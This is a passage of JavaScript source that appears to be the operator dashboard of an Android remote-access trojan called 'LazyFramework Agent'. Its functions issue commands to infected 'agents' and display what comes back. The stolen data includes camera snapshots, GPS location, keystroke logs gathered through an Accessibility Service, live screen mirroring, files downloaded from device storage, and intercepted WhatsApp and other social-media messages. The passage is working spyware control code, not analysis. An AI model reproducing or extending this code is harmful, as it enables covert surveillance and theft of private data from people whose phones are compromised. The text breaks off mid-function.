        console.log('🖼️ Wallpaper response:', result);
        showWallpaperInTab(result);
        if (result.status === 'success') {
            addOutputLine(`🖼️ Wallpaper changed successfully! (${result.method || 'unknown'})`, 'success');
        } else if (result.status === 'error') {
            addOutputLine(`❌ Failed to change wallpaper: ${result.message}`, 'error');
        } else {
            addOutputLine(`🖼️ Wallpaper command executed`, 'info');
        }
        return;
    }

    // COMMAND LAIN
    let output = `[${timestamp}] 📥 Response from ${agentId} for ${command}:\n`;
    if (result) {
        output += formatResult(result);
    }
    addOutputLine(output, 'success');
    
    if (result) {
        if (result.image_data && result.type !== 'screen_frame' && result.type !== 'camera_snapshot') {
            showImageInTab(result.image_data, 'screenshot-tab', 'screenshot');
            addOutputLine(`  📸 Screenshot captured (${result.image_data.length} bytes)`, 'info');
        }
        if (result.type === 'camera_snapshot' && result.image_data) {
            showCameraImage(result);
            addOutputLine(`  📷 Camera snapshot captured (${result.camera || 'back'})`, 'info');
        }
        if (result.messages) {
            showWhatsAppMessages(result.messages);
        }
        if (result.logs) {
            showKeylogs(result.logs);
        }
        if (result.latitude && result.longitude) {
            showLocationInTab(result);
        }
        if (result.device || result.manufacturer) {
            addOutputLine(`  📱 Device: ${result.manufacturer || ''} ${result.device || ''}`, 'info');
            addOutputLine(`  🤖 Android: ${result.android_version || result.android || ''}`, 'info');
        }
        if (result.status) {
            addOutputLine(`  📊 Status: ${result.status}`, 'info');
        }
        if (result.message) {
            addOutputLine(`  💬 Message: ${result.message}`, 'info');
        }
        if (result.count !== undefined) {
            addOutputLine(`  📊 Count: ${result.count}`, 'info');
        }
    }

    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ action: 'get_agents' }));
    }
}

// ==================== LOCATION FUNCTIONS ====================

function showLocationInTab(locationData) {
    const container = DOM.locationContent;
    if (!container) return;

    const lat = locationData.latitude;
    const lng = locationData.longitude;
    
    container.innerHTML = `
        <div class="location-card">
            <div class="location-header">
                <h3>📍 Location</h3>
                <span style="color:#6b7a8a;font-size:11px;">${new Date().toLocaleString()}</span>
            </div>
            
            <div class="location-coords">
                <div>
                    <div class="label">Latitude</div>
                    <div class="value">${lat}</div>
                </div>
                <div>
                    <div class="label">Longitude</div>
                    <div class="value">${lng}</div>
                </div>
            </div>
            
            <div class="location-details">
                <div>
                    <div class="label">Accuracy</div>
                    <div class="value">${locationData.accuracy || 'N/A'}m</div>
                </div>
                <div>
                    <div class="label">Provider</div>
                    <div class="value">${locationData.provider || 'N/A'}</div>
                </div>
                <div>
                    <div class="label">Altitude</div>
                    <div class="value">${locationData.altitude || 'N/A'}m</div>
                </div>
                <div>
                    <div class="label">Time</div>
                    <div class="value" style="font-size:10px;">${locationData.time || 'N/A'}</div>
                </div>
            </div>
            
            <div class="location-actions">
                <a href="${locationData.maps_url}" target="_blank" class="btn-maps">
                    🗺️ Open in Google Maps
                </a>
                <button class="btn-copy" onclick="copyToClipboard('${lat}, ${lng}')">
                    📋 Copy Coordinates
                </button>
            </div>
        </div>
    `;
    
    switchToTab('location');
}

function showLocationPermissionGuide() {
    const container = DOM.outputContent;
    if (!container) return;
    
    const guide = document.createElement('div');
    guide.style.cssText = `
        background: #1a0a0a;
        border: 1px solid #ff6b6b;
        border-radius: 8px;
        padding: 16px;
        margin: 8px 0;
    `;
    guide.innerHTML = `
        <div style="color:#ff6b6b;font-weight:bold;font-size:14px;">📡 Location Permission Required</div>
        <div style="color:#c8d6e5;font-size:13px;margin:8px 0;">
            Please enable location permission on the device:
        </div>
        <div style="color:#6b7a8a;font-size:12px;font-family:'Courier New',monospace;background:#0a0e17;padding:12px;border-radius:4px;">
            1. Go to Settings → Apps → LazyFramework Agent → Permissions<br>
            2. Enable Location permission<br>
            3. Or enable GPS/Network location in Quick Settings
        </div>
        <div style="margin-top:8px;color:#ffd93d;font-size:12px;">
            💡 The app will automatically try again when location is enabled.
        </div>
        <button onclick="sendCommand('GET_LOCATION')" style="margin-top:10px;padding:6px 16px;background:#00d2ff;color:#0a0e17;border:none;border-radius:4px;cursor:pointer;font-weight:bold;">
            🔄 Retry Location
        </button>
    `;
    container.appendChild(guide);
    container.scrollTop = container.scrollHeight;
}

// ==================== CAMERA FUNCTIONS ====================

function showCameraInfo(cameraData) {
    const container = DOM.cameraContent;
    if (!container) return;

    const hasBack = cameraData.has_back_camera || false;
    const hasFront = cameraData.has_front_camera || false;
    const hasCamera = cameraData.has_camera || (hasBack || hasFront);

    container.innerHTML = `
        <div class="camera-info-card">
            <div class="camera-header">
                <h3>📷 Camera Info</h3>
                <span style="color:#6b7a8a;font-size:11px;">${new Date().toLocaleString()}</span>
            </div>
            
            <div class="camera-status">
                <div>
                    <div class="label">📸 Camera Available</div>
                    <div class="value ${hasCamera ? 'has' : 'no'}">${hasCamera ? '✅ Yes' : '❌ No'}</div>
                </div>
                <div>
                    <div class="label">📷 Back Camera</div>
                    <div class="value ${hasBack ? 'has' : 'no'}">${hasBack ? '✅ Available' : '❌ Not Available'}</div>
                </div>
                <div>
                    <div class="label">🤳 Front Camera</div>
                    <div class="value ${hasFront ? 'has' : 'no'}">${hasFront ? '✅ Available' : '❌ Not Available'}</div>
                </div>
                <div>
                    <div class="label">📱 Device</div>
                    <div class="value" style="font-size:12px;">${cameraData.device || 'Unknown'}</div>
                </div>
            </div>
            
            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
                <button onclick="sendCommand('CAMERA_SNAPSHOT', 'back')" style="flex:1;padding:8px;background:#ff6b6b;color:#0a0e17;border:none;border-radius:4px;cursor:pointer;font-weight:bold;">
                    📷 Back Camera
                </button>
                <button onclick="sendCommand('CAMERA_SNAPSHOT', 'front')" style="flex:1;padding:8px;background:#ff6b6b;color:#0a0e17;border:none;border-radius:4px;cursor:pointer;font-weight:bold;">
                    🤳 Front Camera
                </button>
                <button onclick="sendCommand('CAMERA_INFO')" style="flex:1;padding:8px;background:#1a2633;color:#c8d6e5;border:none;border-radius:4px;cursor:pointer;">
                    🔄 Refresh Info
                </button>
            </div>
        </div>
    `;
    
    switchToTab('camera');
}

function showCameraImage(cameraData) {
    const container = DOM.cameraContent;
    if (!container) return;

    // Remove old images if exists
    const oldImages = container.querySelectorAll('.camera-image-wrapper');
    oldImages.forEach(el => el.remove());

    const wrapper = document.createElement('div');
    wrapper.className = 'camera-image-wrapper';
    wrapper.style.cssText = `
        background: #0d1520;
        border-radius: 8px;
        padding: 12px;
        border: 1px solid #1a2633;
        margin-bottom: 10px;
    `;

    const header = document.createElement('div');
    header.style.cssText = `
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 8px;
        color: #6b7a8a;
        font-size: 11px;
    `;
    const cameraLabel = cameraData.camera === 'front' ? '🤳 Front Camera' : '📷 Back Camera';
    header.innerHTML = `
        <span style="color:#ff6b6b;font-weight:bold;">${cameraLabel}</span>
        <span>${new Date().toLocaleString()}</span>
    `;
    wrapper.appendChild(header);

    const imgWrapper = document.createElement('div');
    imgWrapper.style.cssText = 'text-align:center;';
    
    const img = document.createElement('img');
    img.src = `data:image/jpeg;base64,${cameraData.image_data}`;
    img.style.cssText = `
        max-width: 100%;
        max-height: 400px;
        border-radius: 6px;
        border: 1px solid #1a2633;
        cursor: pointer;
        object-fit: contain;
    `;
    img.onclick = () => window.open(img.src, '_blank');
    imgWrapper.appendChild(img);
    wrapper.appendChild(imgWrapper);

    const actions = document.createElement('div');
    actions.style.cssText = `
        display: flex;
        gap: 8px;
        margin-top: 8px;
        flex-wrap: wrap;
    `;
    
    const downloadBtn = document.createElement('button');
    downloadBtn.textContent = '⬇️ Download';
    downloadBtn.style.cssText = `
        padding: 4px 12px;
        background: #00d2ff;
        color: #0a0e17;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 12px;
    `;
    downloadBtn.onclick = () => {
        const link = document.createElement('a');
        link.href = img.src;
        link.download = `camera_${cameraData.camera || 'back'}_${Date.now()}.jpg`;
        link.click();
    };
    actions.appendChild(downloadBtn);

    const retryBtn = document.createElement('button');
    retryBtn.textContent = '📷 Take Another';
    retryBtn.style.cssText = `
        padding: 4px 12px;
        background: #1a2633;
        color: #c8d6e5;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 12px;
    `;
    retryBtn.onclick = () => {
        sendCommand('CAMERA_SNAPSHOT', cameraData.camera || 'back');
    };
    actions.appendChild(retryBtn);

    wrapper.appendChild(actions);
    container.appendChild(wrapper);
    
    // Keep only last 10 images
    while (container.querySelectorAll('.camera-image-wrapper').length > 10) {
        container.removeChild(container.querySelector('.camera-image-wrapper'));
    }
    
    container.scrollTop = 0;
    switchToTab('camera');
}

// ==================== FILES SYSTEM FUNCTIONS ====================

function showFilesList(data) {
    console.log('📁 showFilesList called with:', data);
    
    const container = document.getElementById('files-content');
    if (!container) {
        console.warn('⚠️ Files container not found');
        return;
    }

    container.innerHTML = '';

    const result = data.data || data.result || {};
    let files = result.data || [];
    let count = result.count || files.length || 0;
    let path = result.path || '/sdcard';
    
    if (result.status === 'error') {
        const errorDiv = document.createElement('div');
        errorDiv.style.cssText = `
            background: #2a0a0a;
            border: 1px solid #ff6b6b;
            border-radius: 8px;
            padding: 16px;
            color: #ff6b6b;
            text-align: center;
        `;
        errorDiv.textContent = `❌ ${result.message || 'Failed to load files'}`;
        container.appendChild(errorDiv);
        return;
    }
    
    // Breadcrumb
    const breadcrumb = document.createElement('div');
    breadcrumb.className = 'breadcrumb';
    
    const homeBtn = document.createElement('span');
    homeBtn.className = 'breadcrumb-item home';
    homeBtn.textContent = '📁 /';
    homeBtn.onclick = () => {
        if (selectedAgent) {
            addOutputLine('📁 Going to root /sdcard', 'info');
            sendCommand('GET_FILES_LIST', '/sdcard');
        }
    };
    breadcrumb.appendChild(homeBtn);
    
    const pathParts = path.split('/').filter(p => p);
    let currentPath = '';
    pathParts.forEach((part, index) => {
        const separator = document.createElement('span');
        separator.className = 'breadcrumb-separator';
        separator.textContent = '›';
        breadcrumb.appendChild(separator);
        
        const link = document.createElement('span');
        link.className = 'breadcrumb-item';
        link.textContent = part;
        currentPath += '/' + part;
        const pathToNavigate = currentPath;
        link.onclick = () => {
            if (selectedAgent) {
                addOutputLine(`📁 Navigating to: ${pathToNavigate}`, 'info');
                sendCommand('GET_FILES_LIST', pathToNavigate);
            }
        };
        breadcrumb.appendChild(link);
    });
    container.appendChild(breadcrumb);
    
    // Header
    const header = document.createElement('div');
    header.style.cssText = `
        display: flex;
        gap: 12px;
        padding: 6px 0 10px 0;
        border-bottom: 1px solid #1a2633;
        margin-bottom: 10px;
        color: #6b7a8a;
        font-size: 11px;
        flex-wrap: wrap;
    `;
    header.innerHTML = `
        <span>📁 Path: <strong style="color:#fcc419;">${path}</strong></span>
        <span>📊 Total: <strong style="color:#ffd93d;">${count}</strong> items</span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
    `;
    container.appendChild(header);

    if (!files || files.length === 0) {
        const empty = document.createElement('div');
        empty.className = 'info';
        empty.textContent = '📁 No files found in this directory';
        empty.style.cssText = 'padding:20px;text-align:center;color:#6b7a8a;';
        container.appendChild(empty);
        return;
    }

    files.sort((a, b) => {
        if (a.is_directory && !b.is_directory) return -1;
        if (!a.is_directory && b.is_directory) return 1;
        return (a.name || '').localeCompare(b.name || '');
    });

    files.forEach((item, index) => {
        const row = document.createElement('div');
        row.className = 'file-item';
        row.style.background = index % 2 === 0 ? '#0d1520' : '#111927';

        const icon = document.createElement('span');
        icon.className = 'file-icon';
        icon.textContent = item.is_directory ? '📁' : getFileIcon(item.name || '');

        const name = document.createElement('span');
        name.className = `file-name ${item.is_directory ? 'directory' : 'file'}`;
        name.textContent = item.name || 'unnamed';

        const size = document.createElement('span');
        size.className = 'file-size';
        size.textContent = item.is_directory ? '📂' : formatSize(item.size || 0);

        const date = document.createElement('span');
        date.className = 'file-date';
        date.textContent = item.last_modified || '';

        row.appendChild(icon);
        row.appendChild(name);
        row.appendChild(size);
        row.appendChild(date);

        if (!item.is_directory && item.path) {
            const downloadBtn = document.createElement('button');
            downloadBtn.className = 'download-btn';
            downloadBtn.textContent = '⬇️';
            downloadBtn.onclick = (e) => {
                e.stopPropagation();
                if (selectedAgent) {
                    addOutputLine(`⬇️ Downloading: ${item.path}`, 'info');
                    sendCommand('DOWNLOAD_FILE', item.path);
                }
            };
            row.appendChild(downloadBtn);
        }

        if (item.is_directory && item.path) {
            row.onclick = () => {
                if (selectedAgent) {
                    addOutputLine(`📁 Navigating to: ${item.path}`, 'info');
                    sendCommand('GET_FILES_LIST', item.path);
                }
            };
            row.title = `Click to open ${item.path}`;
        }

        container.appendChild(row);
    });

    switchToTab('files');
}

function getFileIcon(filename) {
    const ext = filename.split('.').pop().toLowerCase();
    const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'];
    const videoExts = ['mp4', 'avi', 'mkv', 'mov', 'wmv', 'flv', 'webm'];
    const audioExts = ['mp3', 'wav', 'ogg', 'flac', 'aac', 'm4a'];
    const docExts = ['pdf', 'doc', 'docx', 'txt', 'rtf', 'odt'];
    const archiveExts = ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'];
    const codeExts = ['js', 'py', 'java', 'cpp', 'c', 'h', 'html', 'css', 'php', 'go', 'rs'];

    if (imageExts.includes(ext)) return '🖼️';
    if (videoExts.includes(ext)) return '🎬';
    if (audioExts.includes(ext)) return '🎵';
    if (docExts.includes(ext)) return '📄';
    if (archiveExts.includes(ext)) return '📦';
    if (codeExts.includes(ext)) return '💻';
    return '📄';
}

// ==================== DOWNLOAD FILE HANDLER ====================

function showDownloadedFile(data) {
    console.log('⬇️ showDownloadedFile called with:', data);
    const result = data.data || data.result || {};

    if (result.status === 'success' && result.data) {
        const filename = result.filename || 'downloaded_file';
        const size = result.size || 0;
        
        if (size > 50 * 1024 * 1024) {
            addOutputLine(`❌ File too large: ${formatSize(size)} (max 50MB)`, 'error');
            return;
        }
        
        try {
            const link = document.createElement('a');
            link.href = `data:application/octet-stream;base64,${result.data}`;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            addOutputLine(`✅ File downloaded: ${filename} (${formatSize(size)})`, 'success');
            showDownloadedFilePreview(result);
        } catch (e) {
            addOutputLine(`❌ Download error: ${e.message}`, 'error');
        }
    } else {
        const msg = result.message || 'Unknown error';
        addOutputLine(`❌ Download failed: ${msg}`, 'error');
    }
}

function showDownloadedFilePreview(result) {
    const container = document.getElementById('files-content');
    if (!container) return;

    const wrapper = document.createElement('div');
    wrapper.style.cssText = `
        background: #0d1520;
        border: 1px solid #51cf66;
        border-radius: 8px;
        padding: 12px;
        margin-bottom: 10px;
    `;

    const header = document.createElement('div');
    header.style.cssText = `
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 8px;
        color: #51cf66;
        font-size: 13px;
    `;
    header.innerHTML = `
        <span>✅ File Downloaded: <strong>${result.filename || 'file'}</strong></span>
        <span style="color:#6b7a8a;font-size:11px;">${formatSize(result.size || 0)}</span>
    `;
    wrapper.appendChild(header);

    const ext = (result.filename || '').split('.').pop().toLowerCase();
    const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'];
    
    if (result.data && imageExts.includes(ext)) {
        const imgWrapper = document.createElement('div');
        imgWrapper.style.cssText = 'text-align:center;margin-top:8px;';
        const img = document.createElement('img');
        img.src = `data:image/${ext === 'svg' ? 'svg+xml' : ext};base64,${result.data}`;
        img.style.cssText = `
            max-width: 100%;
            max-height: 300px;
            border-radius: 6px;
            border: 1px solid #1a2633;
            cursor: pointer;
        `;
        img.onclick = () => window.open(img.src, '_blank');
        imgWrapper.appendChild(img);
        wrapper.appendChild(imgWrapper);
    }

    const textExts = ['txt', 'log', 'json', 'xml', 'html', 'css', 'js', 'py', 'java', 'cpp', 'go', 'rs'];
    if (result.data && textExts.includes(ext)) {
        try {
            const text = atob(result.data);
            const preview = document.createElement('pre');
            preview.style.cssText = `
                background: #0a0e17;
                padding: 10px;
                border-radius: 4px;
                max-height: 200px;
                overflow-y: auto;
                font-size: 11px;
                font-family: 'Courier New', monospace;
                color: #c8d6e5;
                white-space: pre-wrap;
                word-break: break-word;
                margin-top: 8px;
                border: 1px solid #1a2633;
            `;
            preview.textContent = text.substring(0, 5000) + (text.length > 5000 ? '\n\n... (truncated)' : '');
            wrapper.appendChild(preview);
        } catch (e) {}
    }

    container.appendChild(wrapper);
    switchToTab('files');
}

// ==================== WALLPAPER FUNCTIONS ====================

function showWallpaperInTab(result) {
    const container = DOM.wallpaperContent;
    if (!container) return;

    const wrapper = document.createElement('div');
    wrapper.style.cssText = `
        margin-bottom: 10px;
        padding: 10px 14px;
        background: #0d1520;
        border-radius: 8px;
        border: 1px solid #1a2633;
    `;

    const timeLabel = document.createElement('div');
    timeLabel.style.cssText = `
        color: #6b7a8a;
        font-size: 10px;
        font-family: 'Courier New', monospace;
        margin-bottom: 6px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    `;
    timeLabel.innerHTML = `
        <span>🖼️ Wallpaper ${new Date().toLocaleString()}</span>
        <span style="color:#4a5a6a;">${result.method || 'unknown'}</span>
    `;
    wrapper.appendChild(timeLabel);

    if (result.message) {
        const msg = document.createElement('div');
        const isSuccess = result.status === 'success';
        msg.style.cssText = `
            color: ${isSuccess ? '#51cf66' : '#ff6b6b'};
            font-size: 12px;
            margin-bottom: 6px;
            padding: 4px 8px;
            background: ${isSuccess ? 'rgba(81, 207, 102, 0.1)' : 'rgba(255, 107, 107, 0.1)'};
            border-radius: 4px;
        `;
        msg.textContent = (isSuccess ? '✅ ' : '❌ ') + result.message;
        wrapper.appendChild(msg);
    }

    if (result.image_data) {
        const imgWrapper = document.createElement('div');
        imgWrapper.style.cssText = `
            margin-top: 6px;
            text-align: center;
            background: #0a0e17;
            border-radius: 4px;
            padding: 4px;
        `;
        const img = document.createElement('img');
        img.src = `data:image/jpeg;base64,${result.image_data}`;
        img.style.cssText = `
            max-width: 100%;
            max-height: 300px;
            border-radius: 6px;
            border: 1px solid #1a2633;
            cursor: pointer;
            object-fit: contain;
        `;
        img.onclick = () => window.open(img.src, '_blank');
        imgWrapper.appendChild(img);
        wrapper.appendChild(imgWrapper);
    }

    container.appendChild(wrapper);
    while (container.children.length > 10) {
        container.removeChild(container.firstChild);
    }
    switchToTab('wallpaper');
}

// ==================== KEYLOG HANDLER ====================

// ==================== HANDLE KEYLOG DATA ====================

function handleKeylogData(data) {
    console.log('⌨️ Keylog data received:', data);
    
    const container = DOM.keylogContent;
    if (!container) return;

    const keylogData = data.data || {};
    let logs = keylogData.logs || '';
    let count = keylogData.count || 0;
    let isLogging = keylogData.is_logging || false;
    let queueSize = keylogData.queue_size || 0;
    let historySize = keylogData.history_size || 0;

    // ✅ CEK JIKA DATA DARI BROADCAST
    if (!logs && data.logs) {
        logs = data.logs;
    }
    if (!count && data.count !== undefined) {
        count = data.count;
    }
    if (data.is_logging !== undefined) {
        isLogging = data.is_logging;
    }

    // ✅ FORMAT LOGS
    if (logs) {
        let fullLogs = logs;
        if (!fullLogs.includes('=== KEYLOGS')) {
            fullLogs = `=== KEYLOGS ===\nTotal: ${count} keystrokes\nQueue: ${queueSize}\nHistory: ${historySize}\nLogging: ${isLogging}\n\n${fullLogs}`;
        }
        showKeylogs(fullLogs);
        
        // ✅ NOTIFIKASI DI OUTPUT
        const preview = logs.substring(0, 100) + (logs.length > 100 ? '...' : '');
        addOutputLine(`⌨️ Keylogs from ${data.agent_id}: ${preview}`, 'info');
        if (count > 0) {
            addOutputLine(`⌨️ Total: ${count} keystrokes`, 'info');
        }
    } else {
        // ✅ TIDAK ADA LOGS
        const noLogsMsg = `⚠️ No keylogs received.\n\n📊 Stats:\n  • Total: ${count}\n  • Queue: ${queueSize}\n  • History: ${historySize}\n  • Logging: ${isLogging ? '✅ Active' : '❌ Stopped'}\n\n💡 Make sure Accessibility Service is ENABLED and type something.`;
        showKeylogs(noLogsMsg);
        addOutputLine(`⌨️ No keylog data from ${data.agent_id}`, 'warning');
    }
    
    // ✅ SWITCH KE TAB KEYLOG
    switchToTab('keylog');
}

// ==================== EXPORT KEYLOGS ====================

function exportKeylogs() {
    const container = DOM.keylogContent;
    const pre = container.querySelector('pre');
    if (!pre) {
        addOutputLine('⚠️ No keylogs to export', 'error');
        return;
    }
    
    const content = pre.textContent || pre.innerHTML;
    const timestamp = new Date().toLocaleString();
    const filename = `keylogs_${Date.now()}.txt`;
    
    const header = `=== KEYLOGS EXPORT ===\n`;
    const date = `Exported: ${timestamp}\n`;
    const separator = '='.repeat(50) + '\n\n';
    
    const fullContent = header + date + separator + content;
    
    downloadFile(fullContent, filename, 'text/plain');
    addOutputLine(`📤 Keylogs exported to ${filename}`, 'success');
}

// ==================== SHOW KEYLOGS ====================

function showKeylogs(logs) {
    const container = DOM.keylogContent;
    if (!container) return;

    // ✅ BERSIHKAN CONTAINER
    container.innerHTML = '';

    // ✅ PARSE STATS DARI LOGS
    let count = 0;
    let isLogging = false;
    let queueSize = 0;
    let historySize = 0;

    const countMatch = logs.match(/Total keystrokes: (\d+)/);
    if (countMatch) count = parseInt(countMatch[1]);

    const queueMatch = logs.match(/Queue size: (\d+)/);
    if (queueMatch) queueSize = parseInt(queueMatch[1]);

    const historyMatch = logs.match(/History size: (\d+)/);
    if (historyMatch) historySize = parseInt(historyMatch[1]);

    const loggingMatch = logs.match(/Logging enabled: (true|false)/);
    if (loggingMatch) isLogging = loggingMatch[1] === 'true';

    // ✅ HEADER STATS
    const header = document.createElement('div');
    header.className = 'keylog-header';
    header.style.cssText = `
        display: flex;
        gap: 12px;
        padding: 10px 14px;
        background: #0d1520;
        border-radius: 6px;
        border: 1px solid #1a2633;
        margin-bottom: 10px;
        color: #6b7a8a;
        font-size: 12px;
        font-family: 'Courier New', monospace;
        flex-wrap: wrap;
        flex-shrink: 0;
    `;

    const hasData = count > 0 && logs && !logs.includes('No keylogs') && !logs.includes('⚠️');
    const statusIcon = hasData ? '✅' : '⚠️';
    const statusText = hasData ? 'Data available' : 'No data';

    header.innerHTML = `
        <span>${statusIcon} Status: <strong style="color:${hasData ? '#51cf66' : '#ffd93d'};">${statusText}</strong></span>
        <span>📊 Total: <strong style="color:#ffd93d;">${count}</strong> keystrokes</span>
        <span>📋 Queue: <strong style="color:#6b7a8a;">${queueSize}</strong></span>
        <span>📚 History: <strong style="color:#6b7a8a;">${historySize}</strong></span>
        <span>${isLogging ? '🟢 Active' : '🔴 Stopped'}</span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
    `;
    container.appendChild(header);

    // ✅ CONTENT KEYLOGS
    const wrapper = document.createElement('div');
    wrapper.style.cssText = `
        background: #0a0e17;
        padding: 12px;
        border-radius: 6px;
        border: 1px solid #1a2633;
        max-height: 500px;
        overflow-y: auto;
    `;

    const content = document.createElement('pre');
    content.style.cssText = `
        margin: 0;
        font-size: 12px;
        font-family: 'Courier New', monospace;
        white-space: pre-wrap;
        word-break: break-word;
        color: #c8d6e5;
        line-height: 1.6;
        max-width: 100%;
        overflow-x: auto;
    `;

    // ✅ FORMAT LOGS (highlight)
    let formattedLogs = logs;
    formattedLogs = formattedLogs.replace(/\[([^\]]+)\]/g, '<span style="color:#4a5a6a;">[$1]</span>');
    formattedLogs = formattedLogs.replace(/([a-zA-Z0-9._-]+):/g, '<span style="color:#00d2ff;">$1:</span>');
    formattedLogs = formattedLogs.replace(/(\[[A-Z_]+\])/g, '<span style="color:#ffd93d;">$1</span>');
    formattedLogs = formattedLogs.replace(/(\[CLICK:[^\]]+\])/g, '<span style="color:#ff6b6b;">$1</span>');
    formattedLogs = formattedLogs.replace(/❌/g, '<span style="color:#ff6b6b;">❌</span>');
    formattedLogs = formattedLogs.replace(/✅/g, '<span style="color:#51cf66;">✅</span>');
    formattedLogs = formattedLogs.replace(/⚠️/g, '<span style="color:#ffd93d;">⚠️</span>');

    content.innerHTML = formattedLogs;

    // ✅ FOOTER
    const footer = document.createElement('div');
    footer.style.cssText = `
        margin-top: 10px;
        padding-top: 10px;
        border-top: 1px solid #1a2633;
        color: #4a5a6a;
        font-size: 11px;
        text-align: center;
    `;
    
    if (hasData) {
        footer.textContent = `--- End of keylog dump (${count} keystrokes) ---`;
    } else {
        footer.innerHTML = `
            --- No keylogs available ---<br>
            <span style="color:#6b7a8a;font-size:10px;">
                💡 Send <code style="background:#1a2633;padding:1px 6px;border-radius:3px;color:#00d2ff;">KEYLOG_START</code> 
                and <code style="background:#1a2633;padding:1px 6px;border-radius:3px;color:#00d2ff;">KEYLOG_DUMP</code> again
            </span>
        `;
    }

    wrapper.appendChild(content);
    wrapper.appendChild(footer);
    container.appendChild(wrapper);
    container.scrollTop = container.scrollHeight;
}

// ==================== LIVE MIRROR FUNCTIONS ====================

function showLiveFrame(frameData) {
    if (!frameData || !frameData.data) {
        console.warn('⚠️ No frame data to display');
        return;
    }
    
    const container = DOM.livemirrorContent;
    if (!container) return;
    
    let video = container.querySelector('#live-mirror-video');
    if (!video) {
        video = document.createElement('img');
        video.id = 'live-mirror-video';
        video.style.cssText = `
            width: 100%;
            max-width: 800px;
            max-height: 600px;
            border-radius: 8px;
            border: 2px solid #00d2ff;
            box-shadow: 0 0 30px rgba(0, 210, 255, 0.1);
            background: #0a0e17;
            display: block;
            margin: 0 auto;
            object-fit: contain;
        `;
        container.appendChild(video);
        
        const info = document.createElement('div');
        info.id = 'live-mirror-info';
        info.style.cssText = `
            text-align: center;
            color: #6b7a8a;
            font-size: 11px;
            padding: 6px 0;
            font-family: 'Courier New', monospace;
        `;
        info.textContent = '📡 Live Mirror - Receiving frames...';
        container.appendChild(info);
    }
    
    video.src = `data:image/jpeg;base64,${frameData.data}`;
    
    const infoEl = container.querySelector('#live-mirror-info');
    if (infoEl) {
        const frameNum = frameData.frame_number || ++liveMirrorFrameCount;
        const size = frameData.size || frameData.data.length;
        infoEl.textContent = `📡 Live Mirror - Frame #${frameNum} | Size: ${formatSize(size)}`;
    }
}

function resetLiveMirror() {
    stopLiveMirror();
    const container = DOM.livemirrorContent;
    if (container) {
        container.innerHTML = `
            <div class="info">📺 Live mirror preview</div>
            <div class="info" style="font-size:11px;color:#6b7a8a;margin-top:6px;">
                Start with <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">SCREEN_START</code>
            </div>
        `;
    }
    liveMirrorFrameCount = 0;
}

function stopLiveMirror() {
    isLiveMirrorActive = false;
    const container = DOM.livemirrorContent;
    if (container) {
        const video = container.querySelector('#live-mirror-video');
        if (video) video.src = '';
    }
}

// ==================== SCREEN/VIDEO FRAME HANDLERS ====================

function handleScreenFrame(agentId, frame) {
    if (!selectedAgent && agents.length > 0) {
        const agent = agents.find(a => a.id === agentId);
        if (agent) selectAgent(agentId);
    }
    if (selectedAgent !== agentId) return;
    if (frame && frame.data) showLiveFrame(frame);
}

function handleVideoFrame(agentId, frame) {
    if (!selectedAgent && agents.length > 0) {
        const agent = agents.find(a => a.id === agentId);
        if (agent) selectAgent(agentId);
    }
    if (selectedAgent !== agentId) return;
    if (frame && frame.data) showLiveFrame(frame);
}

// ==================== SHOW IMAGE IN TAB ====================

function showImageInTab(imageData, tabId, type) {
    const container = document.getElementById(tabId);
    if (!container) return;

    const wrapper = document.createElement('div');
    wrapper.style.cssText = `
        margin-bottom: 12px;
        border-bottom: 1px solid #1a2633;
        padding: 8px 0;
    `;
    
    const timeLabel = document.createElement('div');
    timeLabel.style.cssText = 'color:#6b7a8a;font-size:11px;margin-bottom:4px;';
    const icon = type === 'camera' ? '📷' : '📸';
    const label = type === 'camera' ? 'Camera' : 'Screenshot';
    timeLabel.textContent = `${icon} ${label} ${new Date().toLocaleString()}`;
    
    const img = document.createElement('img');
    img.src = `data:image/jpeg;base64,${imageData}`;
    img.style.cssText = `
        max-width: 100%;
        max-height: 400px;
        border-radius: 6px;
        border: 1px solid #1a2633;
        cursor: pointer;
    `;
    img.onclick = () => window.open(img.src, '_blank');
    
    wrapper.appendChild(timeLabel);
    wrapper.appendChild(img);
    container.appendChild(wrapper);
}

// ==================== WHATSAPP MESSAGE HANDLER ====================

function handleWhatsAppMessage(data) {
    const container = DOM.whatsappContent;
    if (!container) return;

    const wrapper = document.createElement('div');
    wrapper.className = 'whatsapp-message';
    wrapper.dataset.platform = 'whatsapp';
    
    const badge = document.createElement('span');
    badge.className = 'platform-badge';
    badge.style.cssText = 'background:#1a2633;color:#25D366;';
    badge.textContent = data.app_name || 'WA';
    
    const senderSpan = document.createElement('span');
    senderSpan.className = 'sender';
    senderSpan.textContent = data.sender + ':';
    
    const msgSpan = document.createElement('span');
    msgSpan.className = 'message';
    msgSpan.textContent = data.message;
    
    const timeSpan = document.createElement('span');
    timeSpan.className = 'time';
    timeSpan.textContent = data.timestamp || new Date(data.time_ms * 1000).toLocaleTimeString();
    
    wrapper.appendChild(badge);
    wrapper.appendChild(senderSpan);
    wrapper.appendChild(msgSpan);
    wrapper.appendChild(timeSpan);
    container.appendChild(wrapper);
    container.scrollTop = container.scrollHeight;
}

// ==================== SOCIAL MESSAGE HANDLER ====================

function handleSocialMessage(data) {
    const container = DOM.whatsappContent;
    if (!container) return;

    const wrapper = document.createElement('div');
    wrapper.className = 'whatsapp-message';
    wrapper.dataset.platform = data.platform || 'other';
    
    const icon = document.createElement('span');
    icon.textContent = data.icon || getPlatformIcon(data.platform);
    icon.style.cssText = 'font-size:14px;';
    
    const badge = document.createElement('span');
    badge.className = 'platform-badge';
    const color = getPlatformColor(data.platform);
    badge.style.cssText = `background:${color};color:#0a0e17;`;
    badge.textContent = data.app_name || data.platform || 'Social';
    
    const senderSpan = document.createElement('span');
    senderSpan.className = 'sender';
